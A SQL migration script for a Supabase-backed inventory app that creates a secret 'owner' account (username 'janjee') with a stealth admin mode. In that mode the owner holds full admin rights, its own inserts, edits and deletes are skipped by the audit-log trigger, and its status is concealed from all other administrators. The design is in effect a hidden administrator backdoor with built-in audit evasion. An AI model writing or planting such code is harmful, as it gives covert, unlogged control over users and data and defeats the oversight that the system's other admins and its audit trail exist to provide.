-- 004 — Owner account with a private "admin mode" (โหมดผู้ดูแลระบบ)
--
-- One designated owner account can switch itself into admin mode from Settings:
--   * while OFF  → it behaves as an ordinary approved User (its actions ARE logged)
--   * while ON   → it has full admin powers (manage users, read the audit log) AND its
--                  own add / edit / delete actions are NOT written to the audit log
--
-- To every other admin the account still shows as a normal "User": the two flags that
-- mark it (is_owner, stealth) are never sent to the browser for anyone, the client only
-- ever learns its OWN state through public.owner_state(), and no one can turn another
-- account into an owner or flip these flags from the app (guarded below). The account's
-- identity is not in the web bundle — only here in the database.
--
-- Run once in the Supabase dashboard: SQL Editor -> New query -> paste -> Run.
-- Requires 002_auth_approval.sql and 003_audit_log.sql. Safe to re-run.
--
-- ---------------------------------------------------------------------------------
-- Setting up the owner account:
--   1. Sign up the owner through the web app (สมัครสมาชิก). For this project that is
--      username "janjee".
--   2. Run this file (STEP ★ below marks it as the owner and approves it). If the
--      account did not exist yet when you ran this, just re-run this one line afterwards:
--        update public.profiles set is_owner = true, status = 'approved'
--        where lower(username) = 'janjee';
-- ---------------------------------------------------------------------------------

-- ---------- hidden flags on profiles ----------
alter table public.profiles add column if not exists is_owner boolean not null default false;
alter table public.profiles add column if not exists stealth  boolean not null default false;

-- ---------- is_admin(): owner counts as admin only while in admin mode ----------
create or replace function public.is_admin()
returns boolean
language sql
stable
security definer
set search_path = public
as $$
  select exists (
    select 1 from public.profiles
    where id = auth.uid()
      and status = 'approved'
      and (role = 'Admin' or (is_owner and stealth))
  );
$$;

-- ---------- the owner reads / toggles ONLY their own state ----------
-- owner_state() returns the caller's own flags (false/false for everyone else), so the
-- flags never have to be selectable on the table itself.
create or replace function public.owner_state()
returns json
language sql
stable
security definer
set search_path = public
as $$
  select json_build_object(
    'is_owner', coalesce((select is_owner from public.profiles where id = auth.uid()), false),
    'stealth',  coalesce((select stealth  from public.profiles where id = auth.uid()), false)
  );
$$;

create or replace function public.set_stealth(p_on boolean)
returns json
language plpgsql
security definer
set search_path = public
as $$
begin
  if not coalesce((select is_owner from public.profiles where id = auth.uid()), false) then
    raise exception 'ไม่มีสิทธิ์';
  end if;
  update public.profiles set stealth = coalesce(p_on, false) where id = auth.uid();
  return json_build_object('is_owner', true, 'stealth', coalesce(p_on, false));
end;
$$;

revoke all on function public.owner_state() from public;
revoke all on function public.set_stealth(boolean) from public;
grant execute on function public.owner_state() to authenticated;
grant execute on function public.set_stealth(boolean) to authenticated;

-- ---------- guard: no one changes is_owner/stealth from the app ----------
-- Rewrites the 002 guard (same identity-protection logic) and adds: is_owner can only be
-- changed by a direct SQL session (auth.uid() is null); stealth can only be changed by the
-- owner on their own row (that is what set_stealth does). Everything a client could try is
-- rejected.
create or replace function public.profiles_guard()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  remaining_admins integer;
  loses_admin boolean;
begin
  if tg_op = 'UPDATE' and auth.uid() is not null then
    if new.is_owner is distinct from old.is_owner then
      raise exception 'ไม่มีสิทธิ์แก้ไขสถานะเจ้าของบัญชี';
    end if;
    if new.stealth is distinct from old.stealth
       and not (old.is_owner and old.id = auth.uid()) then
      raise exception 'ไม่มีสิทธิ์แก้ไขโหมดการใช้งาน';
    end if;
  end if;

  -- direct SQL Editor / service role sessions have no auth.uid(): always allowed
  if tg_op = 'DELETE' then
    if auth.uid() is not null and not public.is_admin() then
      raise exception 'ไม่มีสิทธิ์ลบผู้ใช้งาน';
    end if;
    loses_admin := old.role = 'Admin' and old.status = 'approved';
  else
    if auth.uid() is not null and not public.is_admin()
       and (new.role is distinct from old.role
            or new.status is distinct from old.status
            or new.username is distinct from old.username) then
      raise exception 'ไม่มีสิทธิ์แก้ไขสิทธิ์หรือสถานะผู้ใช้งาน';
    end if;
    loses_admin := old.role = 'Admin' and old.status = 'approved'
                   and (new.role <> 'Admin' or new.status <> 'approved');
  end if;

  if loses_admin then
    select count(*) into remaining_admins
    from public.profiles
    where role = 'Admin' and status = 'approved' and id <> old.id;
    if remaining_admins = 0 then
      raise exception 'ระบบต้องมีผู้ดูแลระบบ (Admin) อย่างน้อย 1 คน';
    end if;
  end if;

  if tg_op = 'DELETE' then
    return old;
  end if;

  if new.status = 'approved' and old.status is distinct from 'approved' then
    new.approved_by := auth.uid();
    new.approved_at := now();
  end if;
  return new;
end;
$$;

-- ---------- audit: skip the owner's admin-mode actions; never record the flags ----------
create or replace function public.audit_row_change()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_old jsonb;
  v_new jsonb;
  v_row jsonb;
  v_changed text[];
  v_actor uuid := auth.uid();
  v_username text;
  v_category text;
  v_label text;
  v_code text;
begin
  -- owner in admin (stealth) mode: do not log anything they do
  if v_actor is not null
     and coalesce((select is_owner and stealth from public.profiles where id = v_actor), false) then
    return null;
  end if;

  if tg_op in ('UPDATE', 'DELETE') then v_old := to_jsonb(old); end if;
  if tg_op in ('INSERT', 'UPDATE') then v_new := to_jsonb(new); end if;
  -- the owner flags are private: never store them, and never count them as a change
  if v_old is not null then v_old := v_old - 'is_owner' - 'stealth'; end if;
  if v_new is not null then v_new := v_new - 'is_owner' - 'stealth'; end if;
  v_row := coalesce(v_new, v_old);

  if tg_op = 'UPDATE' then
    select array_agg(key order by key)
      into v_changed
      from jsonb_each(v_new)
     where key <> 'updated_at'
       and value is distinct from (v_old -> key);
    if v_changed is null then
      return null; -- nothing visible changed (e.g. only the stealth toggle)
    end if;
  end if;

  if v_actor is not null then
    select username into v_username from public.profiles where id = v_actor;
  end if;

  if tg_table_name = 'products' then
    v_category := 'product';
    v_label := v_row ->> 'code';
    v_code := v_row ->> 'code';
  elsif tg_table_name = 'stock_movements' then
    v_category := case when v_row ->> 'direction' = 'out' then 'stock_out' else 'stock_in' end;
    v_label := v_row ->> 'product_code';
    v_code := v_row ->> 'product_code';
  elsif tg_table_name = 'import_batches' then
    v_category := 'import';
    v_label := v_row ->> 'file_name';
  else
    v_category := 'user';
    v_label := v_row ->> 'username';
  end if;

  insert into public.audit_log
    (actor_id, actor_username, table_name, category, action, record_id, record_label,
     product_code, changed_fields, old_data, new_data)
  values
    (v_actor, v_username, tg_table_name, v_category, tg_op, v_row ->> 'id', v_label,
     v_code, v_changed, v_old, v_new);

  return null;
end;
$$;

-- ---------- STEP ★ — mark the owner account (no-op if not signed up yet) ----------
update public.profiles set is_owner = true, status = 'approved'
where lower(username) = 'janjee';
